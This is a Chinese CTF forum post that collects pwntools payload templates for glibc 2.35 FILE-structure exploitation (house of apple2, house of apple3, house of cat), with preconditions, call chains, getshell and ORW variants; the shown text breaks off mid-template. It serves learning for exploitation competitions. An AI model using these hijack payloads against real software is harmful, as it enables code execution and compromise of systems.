---
title: libc2.35时代IO利用模板总结
url: https://forum.butian.net/share/3947
source: 奇安信攻防社区
date: 2024-12-18
fetch_date: 2025-10-06T19:36:16.805199
---

# libc2.35时代IO利用模板总结

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### libc2.35时代IO利用模板总结

* [CTF](https://forum.butian.net/topic/52)

libc2.35后去除了常用的hook，通过漏洞获取shell的方式大都变为了IO利用或者栈上ROP链。而IO利用又比较模板化，本文总结了常用了IO系列的模板化payload，方便各位师傅们比赛中拿来即用。

libc2.35时代IO利用模板总结
==================
文章中的利用方法主要针对libc2.35，高版本可做适当修改利用。话不多说，直接开始。
house of apple系列
----------------
libc2.35后的IO利用最知名的就是house of apple了，一共三个系列文章，是[roderick师傅](https://www.roderickchan.cn/zh-cn/)发现并广泛利用。
### house of apple2
基于\*\*IO\\_FILE-&gt;\\_wide\\_data\*\*的利用技巧
条件：
- 已知\*\*heap\*\*地址和\*\*libc\*\*地址
- 能控制程序\*\*执行IO\*\*操作，包括但不限于：从\*\*main\*\*函数返回、调用\*\*exit\*\*函数、通过`\_\_malloc\_assert`触发
- 能控制\*\*vtable\*\*和`\_wide\_data`，一般使用\*\*largebin attack\*\*去控制
利用`\_IO\_wfile\_overflow`函数控制程序执行流：
调用链：\*\*\\_IO\\_wfile\\_overflow\*\* -&gt; \*\*\\_IO\\_wdoallocbuf\*\* -&gt; \*\*\\_IO\\_WDOALLOCATE\*\*
\*\*getshell模板\*\*
```python
def house\_of\_apple2(fake\_IO\_file\_addr):
fake\_IO\_file = flat(
{
0x18: 1, # \_IO\_write\_ptr
0x58: one\_gadget, # chain
0x78: \_IO\_stdfile\_2\_lock, # \_lock
0x90: fake\_IO\_file\_addr, # \_IO\_wide\_data
0xc8: \_IO\_wfile\_jumps, # vtable
0xd0: fake\_IO\_file\_addr, # fake wide vtable
}, filler='\x00'
)
return fake\_IO\_file
```
\*\*ORW模板\*\*
```python
def house\_of\_apple2(fake\_IO\_file\_addr):
fake\_IO\_file = flat(
{
0x18: 1, # \_IO\_write\_ptr
0x58: setcontext + 61, # chain
0x78: \_IO\_stdfile\_2\_lock, # \_lock
0x90: fake\_IO\_file\_addr + 0x100, # \_IO\_wide\_data
0xc8: \_IO\_wfile\_jumps, # vtable
0xf0: {
0xa0: [fake\_IO\_file\_addr + 0x200, ret],
0xe0: fake\_IO\_file\_addr
},
0x1f0: [
pop\_rdi\_ret, fake\_IO\_file\_addr >> 12 << 12,
pop\_rsi\_ret, 0x2000,
pop\_rdx\_rbx\_ret, 7, 0,
pop\_rax\_ret, 10, # mprotect
syscall\_ret,
fake\_IO\_file\_addr + 0x290
],
0x280: asm(shellcraft.cat('flag'))
}, filler='\x00'
)
payload = fake\_IO\_file
return payload
```
\*\*注意：\*\* 上述模板中fake\\_IO\\_file\\_addr地址为伪造的\\_IO\\_FILE起始地址。
### house of apple3
基于\*\*IO\\_FILE-&gt;\\_codecvt\*\*的利用方法。
条件：
- 已知\*\*heap\*\*地址和\*\*libc\*\*基址
- 能控制程序执行\*\*IO\*\*操作，包括但不限于：从\*\*main\*\*函数返回、调用\*\*exit\*\*函数、通过\*\*\\_\\_malloc\\_assert\*\*触发
- 能控制\*\*IO\\_FILE\*\*的\*\*vtable\*\*和\*\*\\_codecvt\*\*，一般使用\*\*largebin attack\*\*去控制
利用`\_IO\_wfile\_underflow`控制程序执行流
\*\*调用链\*\*：\*\*\\_IO\\_wfile\\_underflow\*\* -&gt; \*\*libio\\_codecvt\\_in\*\* -&gt; \*\*fp-&gt;codecvt -&gt; cd\\_in.step -&gt; \\_\\_fct(函数指针)\*\*
```php
\_IO\_wfile\_underflow
\_\_libio\_codecvt\_in
DL\_CALL\_FCT
gs = fp->\_codecvt->\_\_cd\_in.step
\*(gs->\_\_fct)(gs)
```
\*\*getshell模板\*\*
```python
def house\_of\_apple3(fake\_IO\_file\_addr):
fake\_ucontext = ucontext\_t()
fake\_ucontext.rip = ret
fake\_ucontext.rsp = fake\_IO\_file\_addr + 0x300
fake\_ucontext.rdi = fake\_IO\_file\_addr >> 12 << 12
fake\_ucontext.rsi = 0x2000
fake\_ucontext.rdx = 7
fake\_IO\_file = flat(
{
0: 0xffffffffffffffff, # \_IO\_read\_end
0x18: 1, # \_IO\_write\_ptr
0x30: fake\_IO\_file\_addr + 0x100, # \_IO\_buf\_end = \_codecvt.step
0x88: fake\_IO\_file\_addr + 0x40, # \_codecvt
0x90: \_IO\_wide\_data,
0xc8: \_IO\_wfile\_jumps + 0x8, # vtable
0xf0: {
0: 0, # key
0x28: one\_gadget, # fun\_ptr
}
}, filler='\x00'
)
payload = fake\_IO\_file
return payload
```
\*\*ORW模板\*\*
`magic gadget: libc2.36及以上版本被去除`
```python
# <getkeyserv\_handle+576>
mov rdx, qword ptr [rdi + 8];
mov qword ptr [rsp], rax;
call qword ptr [rdx + 0x20]
```
```python
def house\_of\_apple3(fake\_IO\_file\_addr):
frame = SigreturnFrame()
frame.rip = ret
frame.rsp = fake\_IO\_file\_addr + 0x200
frame.rdi = fake\_IO\_file\_addr >> 12 << 12
frame.rsi = 0x2000
frame.rdx = 7
fake\_IO\_file = flat(
{
0: 0xffffffffffffffff, # \_IO\_read\_end
0x18: 1, # \_IO\_write\_ptr
0x30: fake\_IO\_file\_addr + 0x100, # \_IO\_buf\_end = \_codecvt.step
0x88: fake\_IO\_file\_addr + 0x40, # \_codecvt
0x90: \_IO\_wide\_data,
0xc8: \_IO\_wfile\_jumps + 0x8, # vtable
0xf0: {
0: 0, # key
0x8: fake\_IO\_file\_addr + 0x100,
0x20: setcontext + 61,
0x28: magic\_gadget, # fun\_ptr
0x30: bytes(frame)[0x30:]
},
0x1f0: [
pop\_rax\_ret, 10,
syscall\_ret,
fake\_IO\_file\_addr + 0x230
],
0x220: asm(shellcraft.cat('flag'))
}, filler='\x00'
)
payload = fake\_IO\_file
return payload
```
可以结合国资社畜师傅提出的[house of 一骑当千](https://bbs.kanxue.com/thread-276056.htm)达到无条件ORW。
```python
class ucontext\_t:
'''
[0x1c0] must be NULL.
'''
length = 0x1c8
bin\_str = length \* b'\0'
rip = 0
rsp = 0
rbx = 0
rbp = 0
r12 = 0
r13 = 0
r14 = 0
r15 = 0
rsi = 0
rdi = 0
rcx = 0
r8 = 0
r9 = 0
rdx = 0
def \_\_init\_\_(self):
pass
def set\_value(self, offset, value):
if(offset <= 0 or offset > self.length - 8):
raise Exception("Out bound!")
temp = self.bin\_str
temp = temp[:offset] + struct.pack('Q', value) + temp[offset + 8:]
self.bin\_str = temp
def \_\_bytes\_\_(self):
self.set\_value(0x28, self.r8)
self.set\_value(0x30, self.r9)
self.set\_value(0x48, self.r12)
self.set\_value(0x50, self.r13)
self.set\_value(0x58, self.r14)
self.set\_value(0x60, self.r15)
self.set\_value(0x68, self.rdi)
self.set\_value(0x70, self.rsi)
self.set\_value(0x78, self.rbp)
self.set\_value(0x80, self.rbx)
self.set\_value(0x88, self.rdx)
self.set\_value(0x98, self.rcx)
self.set\_value(0xa0, self.rsp)
self.set\_value(0xa8, self.rip) # rip
self.set\_value(0xe0, self.rip) # readable
return self.bin\_str
def house\_of\_apple3(fake\_IO\_file\_addr):
fake\_ucontext = ucontext\_t()
fake\_ucontext.rip = ret
fake\_ucontext.rsp = fake\_IO\_file\_addr + 0x300
fake\_ucontext.rdi = fake\_IO\_file\_addr >> 12 << 12
fake\_ucontext.rsi = 0x2000
fake\_ucontext.rdx = 7
fake\_IO\_file = flat(
{
0: 0xffffffffffffffff, # \_IO\_read\_end
0x18: 1, # \_IO\_write\_ptr
0x30: fake\_IO\_file\_addr + 0x100, # \_IO\_buf\_end = \_codecvt.step
0x88: fake\_IO\_file\_addr + 0x40, # \_codecvt
0x90: \_IO\_wide\_data,
0xc8: \_IO\_wfile\_jumps + 0x8, # vtable
0xf0: {
0: 0, # key
0x28: setcontext, # fun\_ptr
0x30: bytes(fake\_ucontext)[0x30:]
},
0x2f0: [
pop\_rax\_ret, 10,
syscall\_ret,
fake\_IO\_file\_addr + 0x330
],
0x320: asm(shellcraft.cat('flag'))
}, filler='\x00'
)
payload = fake\_IO\_file
return payload
```
house of cat
------------
本质上跟house of apple的思想一致，都是利用\\_IO\\_wide\\_data这样一个结构体，只不过使用了不同的利用链。这个方法是由[catfly师傅](https://bbs.kanxue.com/thread-273895.htm)首次提出，并出了2022年强网杯同名赛题。
\*\*条件：\*\*
- 能够任意写一个可控地址。
- 能够泄露堆地址和libc基址。
- 能够触发IO流（FSOP或触发\\_\\_malloc\\_assert），执行IO相关函数。
\*\*利用链：\*\* \*\*\\_IO\\_wfile\\_seekoff\*\* -&gt; \*\*\\_IO\\_switch\\_to\\_wget\\_mode\*\*
调用链源码如下，只需要绕过下图圈出的限制条件，即可达到利用。
`\_IO\_wfile\_seekof`
![image-20230205004705966.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-972ae4f81cae7f92a1b80f61cd44510a7055fe31.png)
`\_IO\_switch\_to\_wget\_mode`
![image-20230205004944251.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-7207c7189f3b09601208be40a5f73e57da009802.png)
该函数利用了`\_IO\_WOVERFLOW` 这样一个宏，可以在gdb中查看汇编代码。
![image-20230205005206063.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-d0e8b8427bc2801833c62c556030f4ab945c171f.png)
\*\*getshell模板\*\*
```python
def house\_of\_cat(fake\_IO\_file\_addr):
fake\_IO\_file = flat(
{
0x20: [
0, 0,
1, 1,
fake\_IO\_file\_addr, # rdx
system
],
0x58: 0, # chain
0x78: \_IO\_stdfile\_2\_lock, # \_lock
0x90: fake\_IO\_file\_addr + 0x30, # \_IO\_wide\_data
0xb0: 1, # \_mode
0xc8: \_IO\_wfile\_jumps + 0x30, # vtable \_IO\_wfile\_seekoff
0x100: fake\_IO\_file\_addr + 0x40, # fake\_wide\_jumps
}
)...